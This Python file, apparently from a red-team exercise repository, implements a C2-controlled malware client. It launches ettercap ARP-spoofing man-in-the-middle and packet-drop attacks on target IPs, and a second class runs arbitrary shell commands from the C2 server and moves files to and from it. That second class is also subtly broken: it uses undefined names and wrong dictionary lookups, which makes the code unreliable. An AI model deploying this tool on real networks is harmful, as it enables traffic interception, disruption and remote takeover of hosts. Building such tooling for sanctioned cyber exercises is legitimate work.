#-----------------------------------------------------------------------------
# Name:        ettercapWrapper.py
#
# Purpose:     This ettercap wrapper is used to let the red team attacker can 
#              apply different kinds of packet filter on the network traffic via 
#              using ettercap's ARP spoofing function on the router/switch to 
#              launch the packet drop, traffic block or even man in the middle attack.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1.1
# Created:     2024/01/09
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a ARP spoofing attacker for XS2023 which can be linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack verfication demo of the 
    cyber event : Cross Sword 2023
"""

import os
import json
import time
from datetime import datetime

import ConfigLoader
import c2MwUtils

CONFIG_FILE_NAME = 'ettercapWrapperCfg.txt'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

# Init the config loader program.
gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class ettercapWrapper(c2MwUtils.c2TestMalware):

    def __init__(self, malwareID, ownIp, c2Ipaddr, \
                 c2port=5000, reportInt=10, tasksList=None, c2HttpsFlg=False, cmdTDFlg=True) -> None:
        """ Init example:   client = ettercapWrapper(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
        Args:
            malwareID (str): malware id
            ownIp (str): malware ip address
            c2Ipaddr (str): c2 server IP address
            reportInt (int, optional): time interval between 2 report to c2. Defaults to 10 sec.
            tasksList (list of dict, optional): refer to <programRcd> taskList. Defaults to None.
            c2HttpsFlg (bool, optional): flag to identify whether connect to c2 via https. Defaults to False.
            cmdTDFlg (bool, optional): flag to identify whether run the command execution task 
                in the command runner's sub-thread. Defaults to False.
        """
        super().__init__(malwareID, ownIp, c2Ipaddr, c2port=c2port, reportInt=reportInt, \
                         tasksList=tasksList, c2HttpsFlg=c2HttpsFlg, cmdTDFlg=cmdTDFlg)
        print("Ettercap wrapper init finished.")

    #-----------------------------------------------------------------------------
    def _initActionHandlers(self):
         # Init the PLC connector 
        filterCfgPath = os.path.join(dirpath, CONFIG_DICT['FILTER_RCD'])
        self.filterDir = os.path.join(dirpath, CONFIG_DICT['FILTER_DIR'])
        self.filterDict = dict()
        if os.path.exists(filterCfgPath):
            try:
                with open(filterCfgPath) as fh:
                    self.filterDict = json.load(fh)
                return True
            except Exception as err:
                print("Error: open paramter config file error: %s" %str(err))
                return None

    #-----------------------------------------------------------------------------
    def _handleSpecialTask(self, taskDict):
        resultStr = 'taskTypeNotFound'
        if taskDict['taskType'] == 'packetDrop':
            resultStr = self.runPackDroper(taskDict['taskData'])
        return resultStr

    #-----------------------------------------------------------------------------
    def runPackDroper(self, filterName):
        """ Use the command running to execute the ettercap in sub thread and apply 
            the related fileter on it.
        """
        filterName = filterName
        print("Start to run the filter in background.")
        if filterName in self.filterDict.keys():
            filterInfo = self.filterDict[filterName]
            filterFileName = filterInfo['filterFile']
            targetIp = filterInfo['ipaddress']
            filterFilePath = os.path.join(self.filterDir, filterFileName)
            if os.path.exists(filterFilePath):
                ettercapCmd = """ettercap -T -q -F %s -M ARP /%s//""" %(filterFileName, targetIp)
                print("Run ettercap cmd: %s" %ettercapCmd)
                self.cmdRunner.runCmdParallel(ettercapCmd)
            else: 
                print("WARN: Filter file is not exist.")
        else:
            print("WARN: Filter ID is not in the filter record.")

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    malwareID = CONFIG_DICT['OWN_ID']
    ownIP = CONFIG_DICT['OWN_IP']
    c2Ipaddr = CONFIG_DICT['C2_IP']
    c2Port = int(CONFIG_DICT['C2_PORT'])
    c2RptInv = int(CONFIG_DICT['C2_RPT_INV'])
    c2HttpsFlg = CONFIG_DICT['C2_HTTPS'] if 'C2_HTTPS' in CONFIG_DICT else False
    taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            } ]
    client = ettercapWrapper(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
    time.sleep(1)
    client.run()
    client.stop()

if __name__ == '__main__':
    main()


#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class ettercapWrapper2(object):

    def __init__(self) -> None:
        self.malwareID = CONFIG_DICT['OWN_ID']
        self.malownIP = CONFIG_DICT['OWN_IP']
        # Init the C2 connector
        c2Ipaddr = CONFIG_DICT['C2_IP']
        c2Port = int(CONFIG_DICT['C2_PORT'])
        c2RptInv = int(CONFIG_DICT['C2_RPT_INV'])
        c2HttpsFlg = CONFIG_DICT['C2_HTTPS'] if 'C2_HTTPS' in CONFIG_DICT else False
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, 
                                             c2Port=c2Port, ownIP=self.malownIP, reportInt=c2RptInv,
                                             httpsFlg=c2HttpsFlg)
        # Resiger to C2
        self.taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            }
        ]
        self.c2Connector.registerToC2(taskList=self.taskList)
        self.ownRcd = c2MwUtils.mwClientRcd(self.malwareID, self.malownIP, taskList=self.taskList)
        self.cmdRunner = CmdRunner()

        filterCfgPath = os.path.join(dirpath, CONFIG_DICT['FILTER_RCD'])
        self.filterDict = dict()
        if os.path.exists(filterCfgPath):
            try:
                with open(filterCfgPath) as fh:
                    self.filterDict = json.load(fh)
            except Exception as err:
                print("Error: open paramter config file error: %s" %str(err))
                return None
        self.c2Connector.start()
        self.cmdRunner.start()
        self.terminate = False
        print("ettercap wrapper init finished.") 

    #-----------------------------------------------------------------------------
    def run(self):
        while not self.terminate:
            # Check whether got new incomming task
            task = self.c2Connector.getOneC2Task()
            # Sychronized the task record
            if task is not None: self.ownRcd.addNewTask(task)
            # Do tasks one by one
            for taskDict in self.ownRcd.getTaskList(taskState=c2MwUtils.TASK_A_FLG):
                idx = taskDict['taskID']
                resultStr = 'taskfinished'
                for _ in range(taskDict['repeat']):
                    if taskDict['taskType'] == 'upload' or taskDict['taskType'] == 'download':
                        time.sleep(int(taskDict['ExPerT']))
                        uploadFlg = taskDict['taskType'] == 'upload'
                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                        resultStr = 'File transfered'
                    elif taskDict['taskType'] == c2MwUtils.CMD_FLG:
                        cmd = str(taskDict['taskData'][0])
                        print("Run cmd : %s " % str(cmd))
                        resultStr = self.runCmd('detail', cmd)
                    elif taskDict['taskType'] == 'packetDrop':
                        resultStr = self.runPackDroper(taskDict['taskData'])
                    # Add the execution result in the report queue.
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    reportDict ={
                        'taskID'    : idx,
                        'state'     : c2Client.TASK_F_FLG,
                        'Time'      : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'taskData'  : str(resultStr)
                    }
                    self.c2Connector.addNewReport(reportDict)
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    time.sleep(0.1)

    def runPackDroper(self, filterName):
        filterName = filterName
        print("Start to run the filter in background")
        if filterName in self.filterDict.keys():
            filterFileName = self.filterDict['filterFile']
            targetIp = self.filterDict['ipaddress']
            filterFilePath = os.path.join(self.filterDir, filterFileName)
            if os.path.exists(filterFilePath):
                ettercapCmd = """ettercap -T -q -F %s -M ARP /%s//""" %(filterFileName, targetIp)
                print("Run ettercap cmd: %s" %ettercapCmd)
                self.cmdRunner.runCmdParallel(ettercapCmd)
            else: 
                print("Filter file is not exist")
        else:
            print("Filter ID is not in the filter record")


